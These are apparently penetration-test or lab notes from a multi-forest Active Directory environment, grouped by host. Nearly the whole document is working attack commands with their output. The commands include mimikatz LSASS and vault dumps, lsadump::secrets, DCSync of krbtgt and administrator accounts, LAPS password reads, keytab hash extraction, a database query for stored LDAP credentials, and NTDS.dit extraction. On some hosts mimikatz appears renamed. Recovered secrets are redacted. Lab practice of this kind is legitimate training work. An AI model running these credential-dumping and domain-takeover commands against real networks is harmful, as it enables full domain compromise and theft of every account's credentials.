## gcb.example ~ 10.200.9.0

### IT-EMPLOYEE15

1. LAPS: `it-appsrv01:REDACTED_SECRET`
2. LSASS dump on `IT-EMPLOYEE15` recovered additional NTLM hashes (`IT-EMPLOYEE15$` and `itemployee15`)
3. Vault credentials exposed web access at `https://10.200.9.111` (`root : REDACTED_SECRET`, `itemployees : REDACTED_SECRET`) — potential pivot via internal web service (PSWA / bugtracker / internal panel)

```powershell
# Credential hunting — PowerShell history
Get-Content C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# powershell -ep bypass $passwd = ConvertTo-SecureString "REDACTED_SECRET" -AsPlainText -Force
# powershell -ep bypass $passwd = ConvertTo-SecureString "REDACTED_SECRET" -AsPlainText -Force

# Domain attack — LAPS read
Get-LAPSPasswords -Computer it-appsrv01
# REDACTED_SECRET

# Host attack — LSASS dump
.\mimikatz.exe "privilege::debug" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "exit"
# mimikatz(commandline) # sekurlsa:REDACTED_SECRET
# IT-EMPLOYEE15$
# REDACTED_HASH
# itemployee15
# REDACTED_HASH

mimikatz(commandline) # vault:REDACTED_SECRET
#           0.    Internet Explorer
#                 Ressource       : [STRING] https://10.200.9.111/
#                 Identity        : [STRING] itemployees
#                 *Authenticator* : [STRING] REDACTED_SECRET
#           1.    Internet Explorer
#                 Ressource       : [STRING] https://10.200.9.111/
#                 Identity        : [STRING] root
#                 *Authenticator* : [STRING] REDACTED_SECRET
```

### IT-APPSRV01

1. NTLM hash for service account `sqlsvc`: `sqlsvc:REDACTED_SECRET`
2. LSASS dump on `IT-APPSRV01` recovered additional NTLM hashes (`IT-APPSRV01$` and `appsrv01`)

```powershell
./keytabextract.py sqlsrv02.keytab 
#	SERVICE PRINCIPAL : sqlsvc/
#	NTLM HASH : REDACTED_SECRET

.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"
# Domain   : it.gcb.example
# Username : IT-APPSRV01$
# NTLM     : REDACTED_HASH
# Username : appmanager
# NTLM     : REDACTED_HASH
```

### IT-SQLSRV02

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"

# USERNAME : IT-SQLSRV02$
# NTLM     : REDACTED_HASH
# USERNAME : IT-SQLSRV02$
# NTLM     : REDACTED_SECRET
```

### IT-TRACK01

```powershell
cd C:\Bitnami\redmine-4.0.3-3\mysql\bin
.\mysql.exe -u"root" -p"REDACTED_SECRET" -e "use bitnami_redmine; select * from auth_sources\G;"
# ldapintegration : REDACTED_SECRET

.REDACTED_HASH\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"
# Username : trackadmin
# NTLM     : REDACTED_HASH
# Username : IT-TRACK01$
# NTLM     : REDACTED_HASH
```

```powershell
# FROM http://10.200.9.111/redmine/
C:\tools\postEx\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"

Domain   : gcbsec.example
User#name : admin
NTLM     : REDACTED_HASH
Username : SEC-SYSLOG01$
NTLM     : REDACTED_HASH
```

### IT-PREPROD

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"
# Username : IT-PREPROD$
# NTLM     : REDACTED_HASH
# Username : ldapintegration
# NTLM     : REDACTED_HASH
```

### IT-DC

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:it.gcb.example /user:it\administrator" "exit"
# administrator
# REDACTED_HASH
# REDACTED_HASH

# krbtgt
# REDACTED_HASH
# REDACTED_HASH
```

### GCB-DC

```powershell
Invoke-Command -ScriptBlock {C:\tools\mimikatz.exe "privilege::debug" "sekurlsa:REDACTED_SECRET" "lsadump::lsa /patch" "exit"} -Session $gcbsession

sekurlsa:REDACTED_SECRET
# Username : GCB-DC$
# NTLM     : REDACTED_HASH
# Username : Administrator
# NTLM     : REDACTED_HASH

lsadump::lsa /patch
# User : krbtgt
# NTLM : REDACTED_HASH
# User : wsusadmin
# NTLM : REDACTED_HASH
# User : GCB-DC$
# NTLM : REDACTED_HASH
# User : GCB-WSUS$
# NTLM : REDACTED_HASH
# User : IT$
# NTLM : REDACTED_HASH
```

### GCB-WSUS

``` powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"
# Username : wsusadmin
# NTLM     : REDACTED_HASH
# Username : GCB-WSUS$
# NTLM     : REDACTED_HASH
```

## msp.example ~ 10.200.8.0

### INTERNAL-SRV06

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"

# Username : Administrator
# Domain   : INTERNAL-SRV06
# NTLM     : REDACTED_HASH
# Username : INTERNAL-SRV06$
# Domain   : INTERNALMSP
# NTLM     : REDACTED_HASH
# Username : batchsvc
# Domain   : INTERNALMSP
# NTLM     : REDACTED_HASH

mimikatz(commandline) # lsadump::secrets
# internalmsp\batchsvc:REDACTED_SECRET
```

### INTERNAL-DC01

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:internalmsp\krbtgt" "exit"
# Hash NTLM   : REDACTED_HASH
# aes256_hmac : REDACTED_HASH

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:internalmsp\Administrator" "exit"
# Hash NTLM   : REDACTED_HASH
# aes256_hmac : REDACTED_HASH
```

### MSP-SQLREPORT

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"
# Username : mspdb
# NTLM     : REDACTED_HASH
# Username : MSP-SQLREPORT$
# NTLM     : REDACTED_HASH
```

### MSP-SRV01

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"
# Username : MSP-SRV01$
# NTLM     : REDACTED_HASH
# Username : Administrator
# NTLM     : REDACTED_HASH
```
### MSP-DC01

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:msp.example /dc:msp-dc01.msp.example /user:msp\administrator" "exit"
# NTLM : REDACTED_HASH
# AES  : REDACTED_HASH

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:msp.example /dc:msp-dc01.msp.example /user:msp\krbtgt" "exit"
# NTLM : REDACTED_HASH
# AES  : REDACTED_HASH
```

## gcbfinance.example ~ 10.200.10.0

### FINANCE-VANESSA

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"

# Username : vanessa-admin
# NTLM     : REDACTED_HASH
# Username : FINANCE-VANESSA$
# NTLM     : REDACTED_HASH
# Username : Administrator
# NTLM     : REDACTED_HASH

# URL: MICROSOFT_WINRM_RUNAS_ITAdmin
# Login: MICROSOFT_WINRM_RUNAS_ITAdmin
# Password: REDACTED_SECRET
# Name: MICROSOFT_WINRM_RUNAS_ITAdmin
```

### FINANCE-DC01

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"
# USER   : KRBTGT
# NTLM   : REDACTED_HASH
# AES256 : REDACTED_HASH

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:administrator" "exit"
# USER   : Administrator
# NTLM   : REDACTED_HASH
# AES256 : REDACTED_HASH
```

## gcbsec.example ~ 10.200.6.0

### SEC-SYSLOG01

```powershell
.\ls.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"

Username : Administrator
NTLM     : REDACTED_HASH
Username : SEC-SYSLOG01$
NTLM     : REDACTED_HASH
Username : syslogagent
NTLM     : REDACTED_HASH
Password : REDACTED_SECRET
```

### SEC-DC

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"
# NTLM : REDACTED_HASH
# AES  : REDACTED_HASH

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:administrator" "exit"
# NTLM : REDACTED_HASH
# AES  : REDACTED_HASH
```

## gcbacc.example ~ 10.200.12.0

### ACC-DC07

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:gcbacc.example /user:administrator" "exit"
# NTLM : REDACTED_HASH
# AES  : REDACTED_HASH
```
### ACC-DATA

```powershell
type C:\escrow2\escrow2.txt
# REDACTED_SECRET
```
## gcbvault.example ~ 10.200.7.0

### VAULT-SRV

```powershell
Get-ADDBAccount -All -DBPath 'D:\Windows\NTDS\ntds.dit' -BootKey $key

User: Administrator
Domain: gcbvault.example
SID: S-1-5-21-1985505628-2019185050-2365871796-500
NTLM: REDACTED_HASH
AES256: REDACTED_HASH

User: krbtgt
NTLM: REDACTED_HASH
AES256: REDACTED_HASH

User: vaultdbadmin
Description: REDACTED_SECRET
NTLM: REDACTED_HASH
AES256: REDACTED_HASH

Computer: VAULT-DC$
NTLM: REDACTED_HASH
AES256: REDACTED_HASH

Computer: VAULT-DB$
NTLM: REDACTED_HASH
AES256: REDACTED_HASH
```

### VAULT-DB

```powershell
Invoke-Command -Session $dbsession -scriptblock { cat C:\Users\vaultdbadmin\Desktop\transfer.txt}
```

## gcbhr.example ~ 10.200.11.0

### HR-ERIKA

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"

.\ls.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "exit"

# Username : erika
# NTLM     : REDACTED_HASH
# Username : HR-ERIKA$
# NTLM     : REDACTED_HASH
# Username : erika-admin
# NTLM     : REDACTED_HASH
# Password : REDACTED_SECRET

lsadump::secrets
#  hr\erika-admin : REDACTED_SECRET


$pass = ConvertTo-SecureString "REDACTED_SECRET" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("hr\erika-admin", $pass)
```

### HR-DC01

```powershell
.\ls.exe "privilege::debug" "lsadump::dcsync /user:HR\krbtgt" "exit"
# USER   : krbtgt
# NTLM   : REDACTED_HASH
# aes256 : REDACTED_HASH

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:HR\Administrator" "exit"
# USER   : ADMINISTRATOR
# NTLM   : REDACTED_HASH
# aes256 : REDACTED_HASH
```
